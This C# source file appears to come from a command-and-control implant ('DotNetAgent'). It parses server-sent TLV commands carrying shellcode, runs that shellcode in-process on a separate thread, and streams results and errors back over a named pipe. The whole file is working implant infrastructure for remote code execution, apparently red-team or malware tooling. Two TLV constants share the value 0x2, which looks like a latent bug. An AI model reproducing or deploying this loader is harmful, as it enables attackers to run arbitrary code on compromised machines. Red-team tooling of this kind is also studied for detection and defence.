using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace DotNetAgent
{
    internal class PluginCommand
    {
        private const byte PLUGIN_RESULT_CHUNK = 0x30;
        private const byte PLUGIN_CONF_SETTING = 0x31;
        private const byte PLUGIN_ERROR_CHUNK = 0x32;
        private const byte PLUGIN_SUCCESS = 0x33;
        private const byte PLUGIN_FAILURE = 0x34;

        private const byte TLV_EXECUTION_CONTEXT = 0x1;
        private const byte TLV_COMMUNICATION_CHANNEL = 0x2;
        private const byte TLV_EXECUTION_POLICY = 0x2;
        private const byte TLV_SHELLCODE = 0x3;
        private const byte TLV_PIPE_NAME = 0x4;
        private const byte TLV_CONF = 0x5;
        private const byte TLV_COMMAND_ID = 0x6;
        private const byte TLV_ONGOING_VALUE = 0x1;
        private const byte TLV_MAX_STOP_TIME_VALUE = 0x3;

        private byte[] _shellcode;
        private string _pipeName;
        private byte[] _conf;
        private UInt32 _id;

        private MemoryStream _resultData = new MemoryStream();
        private MemoryStream _resultError = new MemoryStream();
        private bool _finished = false;
        private bool _ongoing = false;
        private UInt32 _maxStopTime = 5;
        private bool _noCommunication = false;

        private PluginCommand() { }

        public static void NewPluginCommand(TLV tlv)
        {
            PluginCommand pluginCommand = new PluginCommand();
            if (!pluginCommand.Load(tlv))
            {
                // Cannot report failure to server here: the command ID may not have
                // been parseable from the TLV, so there is no ID to associate a result with.
                return;
            }
            pluginCommand.Run();
        }

        private bool Load(TLV tlv)
        {
            if (!tlv.HasChild(TLV_SHELLCODE) || !tlv.HasChild(TLV_PIPE_NAME) || !tlv.HasChild(TLV_COMMAND_ID))
            {
                Logger.Warning("Plugin command missing required fields (shellcode, pipe name, or command ID)");
                return false;
            }
            _shellcode = tlv.GetChild(TLV_SHELLCODE).Data;
            _pipeName = tlv.GetChild(TLV_PIPE_NAME).GetAsString();
            if (tlv.HasChild(TLV_CONF))
                _conf = tlv.GetChild(TLV_CONF).Data;
            _id = tlv.GetChild(TLV_COMMAND_ID).GetAsUInt32();

            if(tlv.HasChild(TLV_EXECUTION_POLICY))
            {
                TLV execPolicy = tlv.GetChild(TLV_EXECUTION_POLICY);
                if (execPolicy.HasChild(TLV_EXECUTION_CONTEXT) && execPolicy.GetChild(TLV_EXECUTION_CONTEXT).GetAsByte() != 0)
                {
                    MessagesManager.NewResult(_id, null, MessagesManager.CommandStatus.FAILED, Encoding.UTF8.GetBytes("Only SELF execution context is supported"));
                    return false;
                }
                if (execPolicy.HasChild(TLV_COMMUNICATION_CHANNEL) && execPolicy.GetChild(TLV_COMMUNICATION_CHANNEL).GetAsByte() == 0)
                {
                    _noCommunication = true;
                }
            }
            return true;
        }

        private void Run()
        {
            Thread shellcodeThread;
            if (_noCommunication)
            {
                shellcodeThread = new Thread(() => StartShellcode(null));
                RunningCommandsManager.RegisterCommand(_id, new RunningCommandsManager.RunningCommandInfo
                {
                    Thread = shellcodeThread,
                    IsPlugin = true
                });
                shellcodeThread.Start();
                MessagesManager.NewResult(_id, Encoding.UTF8.GetBytes("Started"), MessagesManager.CommandStatus.SUCCESS, null);
                return;
            }

            NamedPipeCommunication pipeCommunication = new NamedPipeCommunication();
            if (!pipeCommunication.CreatePipe(_pipeName))
            {
                Logger.Warning("Could not create named pipe for plugin command");
                MessagesManager.NewResult(_id, null, MessagesManager.CommandStatus.FAILED, Encoding.UTF8.GetBytes("Could not create named pipe"));
                return;
            }
            try
            {
                shellcodeThread = new Thread(() => StartShellcode(pipeCommunication));
                RunningCommandsManager.RegisterCommand(_id, new RunningCommandsManager.RunningCommandInfo
                {
                    Thread = shellcodeThread,
                    Pipe = pipeCommunication,
                    MaxStopTime = _maxStopTime,
                    IsPlugin = true
                });
                shellcodeThread.Start();
                pipeCommunication.WaitConnection(_conf, (data) => GotNewData(data), () => GotDisconnected());
                // DEADLOCK RISK: If the shellcode thread never exits, this blocks indefinitely.
                // Safe as long as Run() is on its own thread (it is, via StartNewPluginCommand).
                shellcodeThread.Join();

                if (!_finished)
                {
                    MessagesManager.NewResult(_id, null, MessagesManager.CommandStatus.FAILED, Encoding.UTF8.GetBytes("Ended without success/failure confirmation"));
                    pipeCommunication.Close();
                }
            }
            finally
            {
                RunningCommandsManager.UnregisterCommand(_id);
                _resultData.Dispose();
                _resultError.Dispose();
            }
        }

        private void GotNewData(byte[] data)
        {
            if (_finished)
                return;

            TLV tlv = new TLV();
            if (!tlv.Load(data))
            {
                Logger.Warning("Command shellcode data was faulty");
                return;
            }

            switch (tlv.Type)
            {
                case PLUGIN_RESULT_CHUNK:
                    if (_ongoing)
                    {
                        MessagesManager.NewResult(_id, tlv.Data, MessagesManager.CommandStatus.ONGOING, null);
                    }
                    else
                    {
                        _resultData.Write(tlv.Data, 0, tlv.Data.Length);
                    }
                    break;

                case PLUGIN_CONF_SETTING:
                    if (tlv.HasChild(TLV_ONGOING_VALUE))
                    {
                        Logger.Info("Command is ongoing");
                        _ongoing = tlv.GetChild(TLV_ONGOING_VALUE).GetAsBool();
                    }
                    if (tlv.HasChild(TLV_MAX_STOP_TIME_VALUE))
                    {
                        _maxStopTime = tlv.GetChild(TLV_MAX_STOP_TIME_VALUE).GetAsUInt32();
                        RunningCommandsManager.UpdateCommandMaxStopTime(_id, _maxStopTime);
                        Logger.Info($"Command max stop time is {_maxStopTime} seconds");
                    }
                    break;

                case PLUGIN_ERROR_CHUNK:
                    if (_ongoing)
                    {
                        MessagesManager.NewResult(_id, null, MessagesManager.CommandStatus.ONGOING, tlv.Data);
                    }
                    else
                    {
                        _resultError.Write(tlv.Data, 0, tlv.Data.Length);
                    }
                    break;

                case PLUGIN_SUCCESS:
                    MessagesManager.NewResult(_id, _resultData.ToArray(), MessagesManager.CommandStatus.SUCCESS, _resultError.ToArray());
                    _finished = true;
                    break;

                case PLUGIN_FAILURE:
                    MessagesManager.NewResult(_id, _resultData.ToArray(), MessagesManager.CommandStatus.FAILED, _resultError.ToArray());
                    _finished = true;
                    break;
            }
        }

        private void GotDisconnected()
        {
            Logger.Info("Command shellcode closed connection");
        }

        private void StartShellcode(NamedPipeCommunication pipeCommunication)
        {
            if (pipeCommunication != null)
            {
                pipeCommunication.WaitUntilListening();
            }
            Logger.Info("Starting command shellcode");
            PluginExecution.ExecuteAsShellcode(_shellcode);
            Logger.Info("Command shellcode ended");
        }
    }
}
